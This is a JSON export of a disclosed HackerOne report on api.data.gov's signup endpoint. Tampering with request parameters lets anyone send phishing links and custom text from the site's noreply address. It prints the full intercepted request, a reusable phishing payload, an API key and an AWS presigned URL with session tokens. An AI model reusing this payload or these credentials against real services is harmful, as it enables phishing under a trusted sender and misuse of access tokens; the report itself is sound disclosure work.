@@ -1,0 +1,124 @@
+{
+  "id": 360171,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjAxNzE=",
+  "url": "https://hackerone.com/reports/360171",
+  "title": "Multiple Bugs in api.data.gov/signup endpoint leads to send custom messages to Anyone",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-05-31T11:13:09.807Z",
+  "submitted_at": "2018-05-31T11:13:09.807Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "pressihackerone",
+    "url": "/pressihackerone",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/umap7pxXrGTSFCJQSuv8zFrh/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 50592,
+    "url": "https://hackerone.com/gsa_bbp",
+    "handle": "gsa_bbp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "GSA Bounty",
+      "twitter_handle": null,
+      "website": "http://gsa.gov",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-11-13T19:14:16.937Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-11-13T19:12:21.254Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hey there,\n\nwhile signing for new api key, i have found two bugs that is unusual and make anyone to send crafted or customised email to someone.\n\nBug 1: - low \n\n1. Go to https://api.data.gov/signup/\n2. Enter first and last name , then enter email id and get api key.\n\n_Bug: You can use the same email id and signup endlessly._\n\n\nBug 2: - Medium/High\n\n1. Go to https://api.data.gov/signup/\n2. Enter first and last name , email and sigup\n3. Now using Burp Suite Intercept the Proxy.The actual data in POST method looks like the following.\n\n\n*POST /api-umbrella/v1/users.json?api_key=8Mndjk7k8ygsU4rM1lwBltMzet1FEAIuZeaqzEqV HTTP/1.1\nHost: api.data.gov\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: application/json, text/javascript, */*; q=0.01\n*Accept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://api.data.gov/signup/\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nContent-Length: 497\nDNT: 1\nConnection: close*\n\n*user%5Bfirst_name%5D=tester&user%5Blast_name%5D=moving&user%5Bemail%5D=testermoving%40gmail.com&user%5Buse_description%5D=&user%5Bterms_and_conditions%5D=1&user%5Bregistration_source%5D=web&options%5Bexample_api_url%5D=https%3A%2F%2Fdeveloper.nrel.gov%2Fapi%2Falt-fuel-stations%2Fv1%2Fnearest.json%3Fapi_key%3D%7B%7Bapi_key%7D%7D%26location%3DDenver%2BCO&options%5Bcontact_url%5D=https%3A%2F%2Fapi.data.gov%2Fcontact%2F&options%5Bsite_name%5D=&options%5Bsend_welcome_email%5D=true&options%5Bemail_from_name%5D=&options%5Bemail_from_address%5D=&options%5Bverify_email%5D=true*\n\n\n4.Now change following parameters as per your choice and send misleading information and phising website from noreply@api.data.gov \n\n**user%5Bfirst_name%5D = Any sentence you want**\n**options%5Bexample_api_url%5D = your phishing site**\n**options%5Bcontact_url%5D = your contact URL**\n\nSend the Request to the server and you will receive a crafted message and URL that leads anyone to visit unwanted website. \n\n**Example:**\n\nHere is my payload that is used to send unintended website URLs and messages which not involved in YOUR DESING. *(you can use the same payload and receive crafted messages and url)*\n\nuser%5Bfirst_name%5D=This is from some governemt, Visit the follwing URL to register.&user%5Blast_name%5D=secondname&user%5Bemail%5D=testermoving%40gmail.com&user%5Buse_description%5D=&user%5Bterms_and_conditions%5D=1&user%5Bregistration_source%5D=web&options%5Bexample_api_url%5D=spoofed.websiteO&options%5Bcontact_url%5D=attackercontact.com&options%5Bsite_name%5D=&options%5Bsend_welcome_email%5D=true&options%5Bemail_from_name%5D=&options%5Bemail_from_address%5D=&options%5Bverify_email%5D=true\n\n{F303584}\n\n## Impact\n\nBug 1 impact:\nAcquiring multiple API keys with same email id which is unusual.\n\nBug 2 impact:\nSend Customised message.\nMain problem here is, email is received from noreply@api.data.gov which is identified as authentic E-Mail.\nChange the _**example URL**_ and make anyone to visit malicious website.\nChange _**contact us**_ website.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 303584,
+      "file_name": "Screen_Shot_2018-05-31_at_4.19.51_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/303/584/6920defacbd62f1ee69bce8a7696f687ba82c1c7/Screen_Shot_2018-05-31_at_4.19.51_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-05-31_at_4.19.51_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-05-31_at_4.19.51_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3DOTL4Z4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T130458Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCP1h%2BMnyvDRDa6h%2F4zIodqh2MzJlGISvpnoEvR4kc2fgIgP8fAE6zkU2xDXiIdq36r00FCUyYf6OQc2MuvlpSL6zgqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDJ2sbhPrB5o6p2UkMiqPBcMZAZzMf1lo6ftFZmyVLqm8Hg2J3xbj6a3GuTLabMbNJWiA%2FZsFo0hE3gxRPbyAqhG6FJuKINNLYiqNvOekzW8sar88psZuM%2FX9%2FNoLvFSAVVJpHHBKNZUcwzDsSG6dL68X0%2F81p9YWjmvjokQY%2B9nuD7359WQ659K26Fclw65VMeRybJ1hUyi2a%2FyS4P%2FH0PoUc1H0vEsvCcDRZFSU2VqX6BFziwRAbmxLuUXTN5m%2F5hWF5b3%2BkgFf3EOVPo%2BXtyBL0zsVvefLcDnkTyLYtjGuMSoKMfdzhMUUnoy%2FSkL%2FnqSrrhe9QDnvuA12WJYXs7dXUtOgD1FweSHqkAlJgnKNM8PYSjJnvj8q9w4J7BBdDstdMKFug3p2hl8P0Z3ewTKwgYQFTrJSgQ5k2oIl05GLUuZEuGlOhqiAdJ0VSwCyoN%2BcsLtWKUwcF5i%2BGCo6ppjPFD80qdzVR70b4ApfmQxVQXMoqtkj6LQcYtZ%2BagRqhM%2BtszUfSlLJd2TtHW1cmvfHpY38mbjTqSHEOfCoz%2FpdesWuHOFHT%2FPgVGOwrKnQpNMV%2FyR1KqF%2B%2F4CD%2FGMR2tktKBwuNfh2OlxQvwD2aE8XvEC%2B4mc3056ID7XSvkKVVQ5FPigZOQTgvmJ494qVF7ehsKzqTF%2B9hAoK4S6zfV7Rj7ZQPgHv3om4hYuHsgUcaD29IgjjBb7uAyiaX%2BnWynmxhoDSjS8R%2BX%2Fh548W%2F5oeVorlsLKwzmcY%2Fn5eCd84hK21TQBO83%2FN5WvC2Rjqcrcse3ypMcrNI7pSoyAYBbW7BZ7x1FSQkjJ0k9%2BmmuCWHGFTK1yvtjTnkqMZorU8FXNTbF9f5hhpv%2FD%2Bx%2FaaWxL40nM7EEpqTFiYBitKsZow7cCtrgY6sQExtT%2FZOBwnOUsXGGVn22KELl38mJ%2B5OivmNc%2Fgks2i4L3ET0mxTFvDVZpjL316NVv%2FbrIj%2Fy2VtfGofe3Raptm7CsozbMN%2FwB4%2F%2B1rcHUIoVQ8JJTc06nsi5aVYzNhXnbrwhbQkoT0dxKYDFETL%2B6%2F051XAavIrnvB5CtHwa5YaT7z83h5GNqUOlmAh9%2BiDFNSkfEsNFaYzGytNE8syYguoEi7iDkqQjn2z2qwL4LrkcU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=67c26068d05b0a730ef7cdbe91b5dc5b54efaa581b1f8da20b94bc72fbf02900",
+      "file_size": 193903,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 15,
+  "voters": [
+    "sameerphad72",
+    "ali",
+    "whitesector",
+    "eveeez",
+    "cryptographer",
+    "wragg-s",
+    "alwaysbehappy",
+    "b73772bded7541989b54f6a",
+    "bshell88",
+    "h3xh0b17",
+    "and 5 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 81493,
+    "asset_type": "URL",
+    "asset_identifier": "api.data.gov",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
